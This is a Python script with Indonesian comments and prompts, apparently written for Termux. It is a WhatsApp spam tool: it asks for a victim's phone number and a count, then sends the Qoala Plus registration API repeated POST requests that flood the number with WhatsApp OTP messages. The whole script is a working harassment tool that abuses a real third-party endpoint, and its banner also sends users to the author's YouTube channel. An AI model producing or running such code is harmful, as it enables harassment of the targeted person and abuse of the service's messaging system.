import os,sys,time,requests
from time import sleep

import os,sys,time,requests,json,random
from requests import post
from requests import get


#mengetik otomatis
def mengetik(z):
    for e in z + "\n":
      sys.stdout.write(e)
      sys.stdout.flush()
      time.sleep(0.02)

os.system('clear')
print ('\033[36;1mSUBSCRIBE DULU YT AYING LUR....!!')
sleep(2)
os.system('termux-open-url https://youtube.com/channel/UCy9LdRfo8_uHGKnvyCBmVBA')

k = 0

sleep(3)
os.system('clear')
#BANNER
print ("")
mengetik("\033[31;1m   _____                          _       __")     
mengetik("\033[31;1m  / ___/____  ____ _____ ___     | |     / /___ _")
mengetik("\033[31;1m \__ \/ __ \/ __ `/ __ `__ \     | | /| / / __ `/")
mengetik("\033[33;1m ___/ / /_/ / /_/ / / / / / /    | |/ |/ / /_/ / ")
mengetik("\033[37;1m/____/ .___/\__,_/_/ /_/ /_/     |__/|__/\__,_/ ") 
mengetik("\033[37;1m    /_/                                          ")
#mau di copy
#subrek dulu lur
print ("")
mengetik("\033[31;1m  ╔════════════════════════════════════════════════╗ ")
mengetik(" \033[33;1m ║  \033[36;1m [•] Authour : VINDRA                     \033[33;1m.                                     ║")
mengetik("\033[33;1m  ║  \033[36;1m  [•] gitHub  : https:github.com/VINZZZ-ID     \033[33;1m                  ║")
mengetik(" \033[33;1m ║  \033[36;1m [•] Yotube  : Termux modsXD                 \033[33;1m                           ║")
mengetik("\033[31;1m  ╚════════════════════════════════════════════════╝")
print ("")
mengetik("\033[36;1m ╔═══════════════════════════╗")
mengetik("\033[36;1m ║\033[33;1mGUNAKAN DNGN  BIJAK \033[36;1m   ")
mengetik("\033[36;1m ╚═══════════════════════════╝")
sleep(1)
#MENU
print ("")
mengetik("\033[1;30m<════════════[\033[1;33;41m • \033[1;37m Input  \033[1;33m• \033[0m\033[1;30m]══════════════>")
print ("")
mengetik("\033[37m[\033[31m•\033[37m]\033[32m Contoh nomor\033[37m : \033[37m\033[33m8Xxx\033[33m")
nomer = input("\033[37m[\033[31m•\033[37m]\033[32m Nomor Target nya asu\033[32m \033[37m:\033[37m\033[33m ")
mengetik("\033[1;30m<════════════[\033[1;33;41m • \033[1;37m Jumlah mau berapa Tol\033[1;33m• \033[0m\033[1;30m]══════════════>")
jumlah = int(input("\033[37m[\033[31m•\033[37m]\033[32m Jumlah Spam mau berapa mah berapa goblok\033[37m :\033[37m\033[33m "))
print ("")
mengetik("\033[1;30m<════════════[\033[1;33;41m • \033[1;37m Status \033[1;33m• \033[0m\033[1;30m]══════════════>")

for k in range(jumlah):
  k += 1
  head = {
  "Host": "api.qoalaplus.com",
  "content-length": "48",
  "accept": "application/json, text/plain, */*",
  "user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36",
  "content-type": "application/json",
  "origin": "https://www.qoalaplus.com",
  "sec-fetch-site": "same-site",
  "sec-fetch-mode": "cors",
  "sec-fetch-dest": "empty",
  "referer": "https://www.qoalaplus.com/",
  "accept-encoding": "gzip, deflate, br",
  "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
  data = json.dumps({"phone_number":"+62"+nomer,"channel":"WA"})
  pos = requests.post("https://api.qoalaplus.com/go-agent/v2/user/register",headers=head,data=data).text
  if "success" in pos:
    print("Spam WhatsApp Qoala Plus Berhasil",k)
  else:
    print("Spam WhatsApp Qoala Plus Gagal Ke",k)

